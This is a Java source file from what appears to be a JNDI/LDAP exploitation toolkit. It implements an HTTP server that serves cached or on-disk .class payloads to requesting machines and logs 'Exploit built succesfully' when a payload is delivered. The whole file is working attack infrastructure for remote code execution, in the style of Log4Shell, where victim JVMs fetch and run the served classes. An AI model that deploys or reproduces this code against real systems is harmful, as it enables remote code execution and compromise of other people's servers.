package com.xen0vas.ldap;

import java.io.File;
import java.io.FileInputStream;
import java.io.IOException;
import java.net.InetSocketAddress;

import com.xen0vas.ldap.utils.Cache;
import com.xen0vas.ldap.utils.Config;
import com.sun.net.httpserver.HttpExchange;
import com.sun.net.httpserver.HttpHandler;
import com.sun.net.httpserver.HttpServer;

@SuppressWarnings("restriction")
public class HTTPServer {
    public static String cwd = System.getProperty("user.dir");
    
    private static  int count = 0; 

    public static void start() throws IOException {

        HttpServer httpServer = HttpServer.create(new InetSocketAddress(Config.httpPort), 0);
        httpServer.createContext("/", new HttpHandler() {
            @Override
            public void handle(HttpExchange httpExchange){
                try {
                    String path = httpExchange.getRequestURI().getPath();
                    if(path.endsWith(".class")){
                        handleClassRequest(httpExchange);
                    }
                } catch (Exception e) {
                    e.printStackTrace();
                }
            }
        });

        httpServer.setExecutor(null);
        httpServer.start();
        System.out.println("[*] HTTP Server Started on port " + Config.httpPort + "...\n");
    }
    
    private static void handleClassRequest(HttpExchange exchange) throws IOException{
        String path = exchange.getRequestURI().getPath();
        String className = path.substring(path.lastIndexOf("/") + 1, path.lastIndexOf("."));
        
        if(Cache.contains(className)){
        	
        	System.out.println("[!] Exploit built succesfully..");
        	System.out.println("[+] Receive Class: " + className + ".class");
            System.out.println("[+] Response Code: " + 200 + "\n");
            
            byte[] bytes = Cache.get(className);
            exchange.sendResponseHeaders(200, bytes.length);
            exchange.getResponseBody().write(bytes);
        }else{
            String pa = cwd + File.separator + "data";
            File file = new File(pa + File.separator + className + ".class");

            if (file.exists()){
                byte[] bytes = new byte[(int) file.length()];
                try (FileInputStream fileInputStream = new FileInputStream(file)) {
                    fileInputStream.read(bytes);
                }
                exchange.getResponseHeaders().set("Content-type","application/octet-stream");
                exchange.sendResponseHeaders(200, file.length() + 1);
                exchange.getResponseBody().write(bytes);
            }else {
                System.out.println("[!] Response Code: " + 404);
                exchange.sendResponseHeaders(404, 0);
            }       
    	}

        }
}
